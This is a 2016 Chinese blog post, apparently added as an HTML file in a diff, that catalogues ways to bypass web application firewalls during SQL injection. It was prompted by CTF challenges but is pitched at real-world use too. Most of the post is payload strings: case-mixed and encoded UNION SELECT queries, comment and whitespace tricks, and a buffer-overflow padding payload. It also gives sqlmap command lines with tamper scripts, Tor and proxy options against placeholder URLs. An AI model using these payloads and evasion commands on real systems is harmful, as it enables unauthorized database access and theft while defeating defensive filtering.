@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      sql注入绕过WAF | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="这几天的CTF题中有好几道题都是sql注入的，但都存在WAF需要绕过，于是整理了一些常见的绕过WAF注入的方法。
+在现实sql注入中我们也常常碰到WAF，那么掌握常见的绕过很有必要。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入绕过WAF | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/10/05/sql注入绕过WAF/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="这几天的CTF题中有好几道题都是sql注入的，但都存在WAF需要绕过，于是整理了一些常见的绕过WAF注入的方法。
+在现实sql注入中我们也常常碰到WAF，那么掌握常见的绕过很有必要。">
+<meta property="og:image" content="http://p1.bqimg.com/567571/7e9eae4c9ba5eb7e.png">
+<meta property="og:updated_time" content="2016-10-09T15:27:43.345Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入绕过WAF | Hello,C">
+<meta name="twitter:description" content="这几天的CTF题中有好几道题都是sql注入的，但都存在WAF需要绕过，于是整理了一些常见的绕过WAF注入的方法。
+在现实sql注入中我们也常常碰到WAF，那么掌握常见的绕过很有必要。">
+<meta name="twitter:image" content="http://p1.bqimg.com/567571/7e9eae4c9ba5eb7e.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">sql注入绕过WAF</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-10-05" class="post-meta__date date">2016-10-05</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/sql注入/">sql注入</a>, <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>这几天的CTF题中有好几道题都是sql注入的，但都存在WAF需要绕过，于是整理了一些常见的绕过WAF注入的方法。</p>
+<p>在现实sql注入中我们也常常碰到WAF，那么掌握常见的绕过很有必要。</p>
+<a id="more"></a>
+<h3 id="0x01、手工注入绕过"><a href="#0x01、手工注入绕过" class="headerlink" title="0x01、手工注入绕过"></a>0x01、手工注入绕过</h3><p>1、大小写混合</p>
+<pre><code>例如：uNIoN sELecT 1,2,3,4
+</code></pre><p>只适用于针对大小写关键字的匹配</p>
+<p>2、替换关键字</p>
+<pre><code>例如：UNIunionON SELselectECT 1,2,3,4
+</code></pre><p>3、使用编码</p>
+<blockquote>
+<p>URL编码</p>
+</blockquote>
+<p>如：空格变为%20、单引号%27、左括号%28、右括号%29，有时候两次编码绕过%252f%252a*/UNION%252f%252a /SELECT</p>
+<blockquote>
+<p>十六进制编码</p>
+</blockquote>
+<p>可以对单个字符进行十六进制编码绕过，亦可以对整个字符串进行编码绕过。</p>
+<blockquote>
+<p>Unicode编码</p>
+</blockquote>
+<p>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
+<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
+<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
+<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
+<p>4、使用注释</p>
+<p>常见注释符号：//, – , /**/, #, –+,–  -, ;，–a</p>
+<blockquote>
+<p>普通注释</p>
+</blockquote>
+<p>%55nION/**/%53ElecT 1,2,3,4</p>
+<blockquote>
+<p>内联注释   /!**/只有MySQL能识别</p>
+</blockquote>
+<p>/<em> !UNION</em> / /<em> !SELECT</em> / 1,2,3</p>
+<p>5、等价函数或命令</p>
+<pre><code>hex()、bin() ==&gt; ascii()
+sleep() ==&gt;benchmark()
+concat_ws()==&gt;group_concat()
+mid()、substr() ==&gt; substring()
+@@user ==&gt; user()
+@@datadir ==&gt; datadir()
+</code></pre><p>and和or有时候不能使用，可以使用&amp;&amp;和||；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</p>
+<p>对于空格的绕过，可以使用如下符号绕过：%20 %09 %0a %0b %0c %0d %a0 /**/</p>
+<p>6、特殊符号</p>
+<blockquote>
+<p>1、使用反引号`</p>
+</blockquote>
+<p>例如select <code>version()</code>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+<blockquote>
+<p>2、使用”-+.”</p>
+</blockquote>
+<p>elect+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p>
+<blockquote>
+<p>3、@符号</p>
+</blockquote>
+<p>select@^ 1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p>
+<p>7、加括号</p>
+<pre><code>例如：/?id=(1)union(select(1),mid(hash,1,32)from(users))
+</code></pre><p>8、缓冲区溢出</p>
+<p>不少WAF都是由C语言编写的，而C语言缓冲区保护机制。如何WAF在处理测试向量时超出其缓冲区长度，就会引发bug从而实现绕过</p>
+<pre><code>例如：id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15–-+
+</code></pre><p> 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，一般要求1000个以上</p>
+<p>参考资料：<a href="http://netsecurity.51cto.com/art/201301/376869.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201301/376869.htm</a></p>
+<h3 id="0x02、Sqlmap注入绕过"><a href="#0x02、Sqlmap注入绕过" class="headerlink" title="0x02、Sqlmap注入绕过"></a>0x02、Sqlmap注入绕过</h3><p>当我们使用sqlmap注入遇到WAF时，可以使用sqlmap中的tamper,它里面有很多实用的防过滤脚本</p>
+<p><img src="http://p1.bqimg.com/567571/7e9eae4c9ba5eb7e.png" alt=""></p>
+<p>首先我们需要确定WAF过滤了那些关键字，比如：单引号、空格、select、union、admin等，当我们确定了过滤机制可以使用tamper进行绕过</p>
+<blockquote>
+<p>如何判断使用那个过滤脚本，最简单的办法就是直接在URL手工带入进行测试，根据返回信息进行判断</p>
+</blockquote>
+<p>使用sqlmap确认是否含有WAF</p>
+<pre><code>sqlmap -u &quot;http://xxx?id=51&amp;types=4&quot; --thread 10 --identify-waf
+</code></pre><p>使用参数进行绕过</p>
+<pre><code>root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候
+ root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
+  root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --delay=3.5 --time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时
+  root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --proxy=211.211.211.211:8080 --proxy-cred=211:985#使用代理进行注入    
+  root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --ignore-proxy#禁止使用系统的代理，直接连接进行注入
+ root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --flush-session#清空会话，重构注入
+ root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --hex#或者使用参数 --no-cast ，进行字符码转换
+ root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot;  --mobile #对移动端的服务器进行注入
+ root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --tor # 匿名注入
+</code></pre><p>使用脚本绕过</p>
+<pre><code>root@kali:~# sqlmap -u &quot;http://xxxx?id=51&amp;types=4&quot; --tamper=A.py,B.py#脚本A，脚本B 
+</code></pre><p>还可以同时使用多个脚本，使用-v参数观察payload的变化</p>
+<p>常见脚本种类：</p>
+<blockquote>
+<p>apostrophemask.py</p>
+</blockquote>
+<p><strong><em>作用：用UTF8代替引号</em></strong></p>
+<blockquote>
+<p>equaltolike.py</p>
+</blockquote>
+<p><strong><em>作用：like代替等号</em></strong></p>
+<blockquote>
+<p>space2dash.py</p>
+</blockquote>
+<p><strong><em>作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</em></strong></p>
+<blockquote>
+<p>greatest.py</p>
+</blockquote>
+<p><strong><em>绕过过滤’&gt;’ ,用GREATEST替换大于号</em></strong></p>
+<blockquote>
+<p>space2hash.py</p>
+</blockquote>
+<p><strong><em>作用：空格替换为#号 随机字符串 以及换行符</em></strong></p>
+<blockquote>
+<p>apostrophenullencode.py</p>
+</blockquote>
+<p><strong><em>绕过过滤双引号，替换字符和双引号。</em></strong></p>
+<blockquote>
+<p>halfversionedmorekeywords.py</p>
+</blockquote>
+<p><strong><em>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</em></strong></p>
+<blockquote>
+<p>space2morehash.py</p>
+</blockquote>
+<p><strong><em>空格替换为 #号 以及更多随机字符串 换行符</em></strong></p>
+<blockquote>
+<p>appendnullbyte.py</p>
+</blockquote>
+<p><strong><em>作用：在有效负荷结束位置加载零字节字符编码</em></strong></p>
+<blockquote>
+<p>ifnull2ifisnull.py</p>
+</blockquote>
+<p><strong><em>作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</em></strong></p>
+<blockquote>
+<p>space2mssqlblank.py(mssql)</p>
+</blockquote>
+<p><strong><em>作用：空格替换为其它空符号</em></strong></p>
+<blockquote>
+<p>base64encode.py</p>
+</blockquote>
+<p><strong><em>作用：用base64编码替换</em></strong></p>
+<blockquote>
+<p>space2mssqlhash.py</p>
+</blockquote>
+<p><strong><em>作用：替换空格</em></strong></p>
+<blockquote>
+<p>modsecurityversioned.py</p>
+</blockquote>
+<p><strong><em>作用：过滤空格，包含完整的查询版本注释</em></strong></p>
+<blockquote>
+<p>space2mysqlblank.py</p>
+</blockquote>
+<p><strong><em>作用：空格替换其它空白符号(mysql)</em></strong></p>
+<blockquote>
+<p>between.py</p>
+</blockquote>
+<p><strong><em>作用：用between替换大于号（&gt;）</em></strong></p>
+<blockquote>
+<p>space2mysqldash.py</p>
+</blockquote>
+<p><strong><em>作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</em></strong><br>注：之前有个mssql的 这个是mysql的</p>
+<blockquote>
+<p>multiplespaces.py</p>
+</blockquote>
+<p><strong><em>作用：围绕SQL关键字添加多个空格</em></strong></p>
+<blockquote>
+<p>space2plus.py</p>
+</blockquote>
+<p><strong><em>作用：用+替换空格</em></strong></p>
+<blockquote>
+<p>bluecoat.py</p>
+</blockquote>
+<p><strong><em>作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</em></strong></p>
+<blockquote>
+<p>nonrecursivereplacement.py</p>
+</blockquote>
+<p><strong><em>作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</em></strong></p>
+<blockquote>
+<p>space2randomblank.py</p>
+</blockquote>
+<p><strong><em>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</em></strong></p>
+<blockquote>
+<p>sp_password.py</p>
+</blockquote>
+<p><strong><em>作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</em></strong></p>
+<blockquote>
+<p>chardoubleencode.py</p>
+</blockquote>
+<p><strong><em>作用: 双url编码(不处理以编码的)</em></strong></p>
+<blockquote>
+<p>unionalltounion.py</p>
+</blockquote>
+<p><strong><em>作用：替换UNION ALL SELECT UNION SELECT</em></strong></p>
+<blockquote>
+<p>charencode.py</p>
+</blockquote>
+<p><strong><em>作用：url编码</em></strong></p>
+<blockquote>
+<p>randomcase.py</p>
+</blockquote>
+<p><strong><em>作用：随机大小写</em></strong></p>
+<blockquote>
+<p>unmagicquotes.py</p>
+</blockquote>
+<p><strong><em>作用：宽字符绕过 GPC addslashes</em></strong></p>
+<blockquote>
+<p>randomcomments.py</p>
+</blockquote>
+<p><strong><em>作用：用/ </em> <em> /分割sql关键字</em></strong></p>
+<blockquote>
+<p>charunicodeencode.py</p>
+</blockquote>
+<p><strong><em>作用：字符串 unicode 编码</em></strong></p>
+<blockquote>
+<p>securesphere.py</p>
+</blockquote>
+<p><strong><em>作用：追加特制的字符串</em></strong></p>
+<blockquote>
+<p>versionedmorekeywords.py</p>
+</blockquote>
+<p><strong><em>作用：注释绕过</em></strong></p>
+<blockquote>
+<p>space2comment.py</p>
+</blockquote>
+<p><strong><em>作用：Replaces space character (‘ ‘) with comments ‘/ </em> <em>/‘</em></strong></p>
+<blockquote>
+<p>halfversionedmorekeywords.py</p>
+</blockquote>
+<p><strong><em>作用：关键字前加注释</em></strong></p>
+<p>参考资料：<a href="http://www.cnblogs.com/lcamry/articles/5622584.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/articles/5622584.html</a><br>        <a href="http://www.vuln.cn/2086" target="_blank" rel="external">http://www.vuln.cn/2086</a></p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/10/05/sql注入绕过WAF/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
